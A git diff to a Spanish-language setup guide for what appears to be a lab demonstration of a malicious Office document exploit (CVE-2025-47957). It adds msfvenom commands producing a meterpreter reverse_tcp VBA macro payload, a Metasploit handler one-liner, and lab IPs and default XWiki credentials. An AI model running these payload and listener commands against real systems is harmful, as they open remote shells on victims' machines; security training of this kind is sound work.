@@ -32,6 +32,10 @@ Estos pasos deben realizarse **antes** de empezar la presentación para asegurar
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP-KALI> LPORT=4444 -f vba
     ```
+    
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.10.3 LPORT=4444 -f vba
+    ```
     *Copiar el output y pegarlo en el script del exploit de Python (`CVE-2025-47957.py`) en la sección de la macro.*
 
 -----
@@ -45,6 +49,9 @@ Estos pasos deben realizarse **antes** de empezar la presentación para asegurar
 1.  **Iniciar Listener (Metasploit):**
     ```bash
     msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP-KALI>; set LPORT 4444; run"
+    ```
+    ```bash
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 172.20.10.3; set LPORT 4444; run"
     ```
 2.  **Generar Documento Malicioso:**
       * Ejecutar el script `CVE-2025-47957.py`.
@@ -126,8 +133,8 @@ Estos pasos deben realizarse **antes** de empezar la presentación para asegurar
 
 ## 📝 Notas Técnicas / Configuración
 
-  * **IP Kali:** `192.168.2.171`
-  * **IP Windows:** `192.168.2.178`
+  * **IP Kali:** `192.168.2.171` or `172.20.10.3`
+  * **IP Windows:** `192.168.2.178` or `172.20.10.5`
   * **Puerto Webserver (Malware):** 8000
   * **Puerto XWiki:** 8080
   * **Credenciales XWiki:** admin / admin
